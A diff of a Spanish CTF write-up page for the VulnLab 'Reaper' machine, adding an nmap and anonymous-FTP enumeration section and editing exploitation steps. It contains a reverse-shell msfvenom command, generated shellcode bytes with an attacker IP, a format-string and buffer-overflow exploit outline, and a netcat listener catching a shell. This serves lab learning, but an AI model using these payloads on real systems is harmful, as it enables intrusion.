@@ -130,9 +130,10 @@
     <div class="izquierda">
       <h3 class="post-title">Contenido</h3><br>
       <ul>
-        <li><a href="#reversing">Reversing</a></li>
-        <li><a href="#exploitation">Explotación</a></li>
-      </ul>
+        <li><a href="#enumeration">Enumeración</a></li>
+        <li><a href="#shell-keysvc">Shell - keysvc</a></li>
+        <!--<li><a href="#shell-system">Shell - system</a></li>-->
+    </ul>
   </div>
 
   <header class="post-header slide-top">
@@ -141,10 +142,49 @@
     <h2 class="post-title">Reaper</h2><br>
   </header>
   
-<section class="post" id="reversing">
-<br><h3 class="post-title">Reversing</h3><br>
+<section class="post" id="enumeration">
+<br><h3 class="post-title">Enumeración</h3><br>
 
-<p class="plain-text">Al ejecutar el <a href="https://github.com/xchg2pwn/ExploitDevelopment/blob/main/Reaper_CTF/dev_keysvc.exe">binario</a> muestra que se ha iniciado un servidor en el puerto <code class="language-plaintext highlighter-rouge">4141</code></p>
+<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code> donde encontramos varios puertos abiertos, entre ellos el <code class="language-plaintext highlighter-rouge">21</code> que corre un servicio <code class="language-plaintext highlighter-rouge">ftp</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nmap </span><span class="p">10.10.122.10
+Nmap scan report for 10.10.122.10  
+PORT     STATE SERVICE
+21/tcp   open  ftp
+80/tcp   open  http
+3389/tcp open  ms-wbt-server
+4141/tcp open  oirtgsvc
+5357/tcp open  wsdapi</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Esta abierto el puerto <code class="language-plaintext highlighter-rouge">80</code> con un servicio <code class="language-plaintext highlighter-rouge">http</code> sin embargo si lo abrimos la web en el navegador nos muestra simplemente la página que viene por defecto en los <code class="language-plaintext highlighter-rouge">IIS</code></p>
+<a href="/vulnlab/reaper/0.png" target="_blank"><div><p><img src="/vulnlab/reaper/0.png"></p></div></a>
+
+<p class="plain-text">Ya que esta abierto iniciaremos por conectarnos a <code class="language-plaintext highlighter-rouge">ftp</code>, en este caso admite la autenticacion por defecto del usuario <code class="language-plaintext highlighter-rouge">anonymous</code> sin proporcionar contraseña</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ftp</span><span class="p"> 10.10.122.10
+Connected to 10.10.122.10.
+220 Microsoft FTP Service
+Name (10.10.122.10:user): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.  
+Password:
+230 User logged in.
+Remote system type is Windows_NT.
+ftp></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Dentro encontramos <code class="language-plaintext highlighter-rouge">2</code> archivos, un archivo <code class="language-plaintext highlighter-rouge">.exe</code> y un <code class="language-plaintext highlighter-rouge">.txt</code>, descargamos ambos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">ftp> dir
+229 Entering Extended Passive Mode (|||5005|)
+125 Data connection already open; Transfer starting.   
+08-14-23  11:12PM                  262 dev_keys.txt
+08-14-23  01:53PM               187392 dev_keysvc.exe
+226 Transfer complete.
+ftp></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutar el binario muestra que se ha iniciado un servidor en el puerto <code class="language-plaintext highlighter-rouge">4141</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="p">PS C:\Users\user\Desktop></span><span class="am"> .\dev_keysvc.exe</span><span class="p">  
 Server listening on port 4141</span>
@@ -190,6 +230,11 @@ Choose an option:
 <code><span class="ve">❯ echo</span><span class="p"> U3RhbmRhcmQgTGljZW5zZQ== | </span><span class="ve">base64</span><span class="p"> -d  
 Standard License</span>
 </code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="shell-keysvc">
+<br><h3 class="post-title">Shell - keysvc</h3><br>
 
 <p class="plain-text">Para poder depurar el programa facilmente abriremos la aplicación dentro de <code class="language-plaintext highlighter-rouge">WinDbg</code></p>
 <a href="/vulnlab/reaper/1.png" target="_blank"><div><p><img src="/vulnlab/reaper/1.png"></p></div></a>
@@ -326,11 +371,6 @@ ReaperKeyCheck+0x1609:
 
 <p class="plain-text">Además de ello utiliza la función <code class="language-plaintext highlighter-rouge">memmove</code> para mover el contenido en base64 ya decodificado a un nuevo buffer sin sanitización ocasionando un buffer overflow</p>
 <a href="/vulnlab/reaper/4.png" target="_blank"><div><p><img src="/vulnlab/reaper/4.png"></p></div></a>
-
-</section>
-
-<section class="post" id="exploitation">
-<br><h3 class="post-title">Explotación</h3><br>
 
 <p class="plain-text">Iniciamos la primera vulnerabilidad, en la opción <code class="language-plaintext highlighter-rouge">1</code> enviamos los primeros <code class="language-plaintext highlighter-rouge">24</code> bytes de la key para validarla, luego la reemplazamos con el formato <code class="language-plaintext highlighter-rouge">%p</code> que deberia hacer un leak de un puntero explotando el format string, luego de ello usamos la opción <code class="language-plaintext highlighter-rouge">2</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
@@ -745,7 +785,7 @@ ReaperKeyCheck+0x1becd:
 
 <p class="plain-text">Luego de ejecutar el ropchain solo nos queda crear un shellcode con <code class="language-plaintext highlighter-rouge">msfvenom</code>, en este caso crearemos uno que nos envie una revshell en caso de que se ejecute</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ msfvenom</span><span class="p"> -p windows/x64/shell_reverse_tcp LHOST=192.168.100.73 LPORT=443 -f python -v shellcode  
+<code><span class="ve">❯ msfvenom</span><span class="p"> -p windows/x64/shell_reverse_tcp LHOST=10.8.0.10 LPORT=443 -f python -v shellcode  
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x64 from the payload
 No encoder specified, outputting raw payload
@@ -773,7 +813,7 @@ shellcode += b"\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
 shellcode += b"\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f"
 shellcode += b"\x33\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81"
 shellcode += b"\xec\xa0\x01\x00\x00\x49\x89\xe5\x49\xbc\x02"
-shellcode += b"\x00\x01\xbb\xc0\xa8\x64\x49\x41\x54\x49\x89"
+shellcode += b"\x00\x01\xbb\x0a\x08\x00\x0a\x41\x54\x49\x89"
 shellcode += b"\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff"
 shellcode += b"\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41"
 shellcode += b"\xba\x29\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31"
@@ -867,7 +907,7 @@ shellcode </span><span class="o">+= </span><span class="no">b</span><span class=
 shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f</span><span class="s">"</span><span class="p">
 shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x33\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81</span><span class="s">"</span><span class="p">
 shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xec\xa0\x01\x00\x00\x49\x89\xe5\x49\xbc\x02</span><span class="s">"</span><span class="p">
-shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x00\x01\xbb\xc0\xa8\x64\x49\x41\x54\x49\x89</span><span class="s">"</span><span class="p">
+shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x00\x01\xbb\x0a\x08\x00\x0a\x41\x54\x49\x89</span><span class="s">"</span><span class="p">
 shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff</span><span class="s">"</span><span class="p">
 shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41</span><span class="s">"</span><span class="p">
 shellcode </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xba\x29\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31</span><span class="s">"</span><span class="p">
@@ -902,19 +942,19 @@ shell.sendlineafter(</span><span class="no">b</span><span class="s">"Exit</span>
 <p class="plain-text">Finalmente al ejecutar nuestro exploit de forma remota obtenemos una reverse shell</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ python3</span><span class="p"> exploit.py
-[</span><span class="ve">+</span><span class="p">] Opening connection to 192.168.100.5 on port 4141: Done  
-[</span><span class="az">*</span><span class="p">] Closed connection to 192.168.100.5 port 4141</span>
+[</span><span class="ve">+</span><span class="p">] Opening connection to 10.10.122.10 on port 4141: Done  
+[</span><span class="az">*</span><span class="p">] Closed connection to 10.10.122.10 port 4141</span>
 </code></pre></div></div><br>
 
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ sudo netcat </span><span class="p">-lvnp 443
 Listening on 0.0.0.0 443
-Connection received on 192.168.100.5 60050
-Microsoft Windows [Versión 10.0.22621.4317]
-(c) Microsoft Corporation. Todos los derechos reservados.  
+Connection received on 10.10.122.10 49824
+Microsoft Windows [Version 10.0.19045.3208]
+(c) Microsoft Corporation. All rights reserved.  
 
 C:\> </span><span class="am">whoami</span><span class="p">
-windows\user
+reaper\keysvc
 C:\></span>
 </code></pre></div></div><br>
 
